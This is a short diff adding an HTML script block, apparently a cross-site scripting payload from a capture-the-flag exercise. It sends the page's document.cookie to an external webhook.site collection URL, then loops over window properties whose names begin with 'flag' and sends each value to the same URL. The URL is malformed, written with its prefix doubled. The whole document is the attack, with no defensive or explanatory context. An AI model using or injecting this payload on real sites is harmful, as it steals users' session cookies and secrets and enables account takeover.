@@ -1,0 +1,10 @@
+<script>
+// 读 cookie
+fetch('https://webhook.site/https://webhook.site/4d6bc5a7-35a9-418a-994d-29c44739f059?c='+document.cookie);
+// 读随机变量
+for(let k in window) {
+  if(k.startsWith('flag')) {
+    fetch('https://webhook.site/https://webhook.site/4d6bc5a7-35a9-418a-994d-29c44739f059?f='+window[k]);
+  }
+}
+</script>
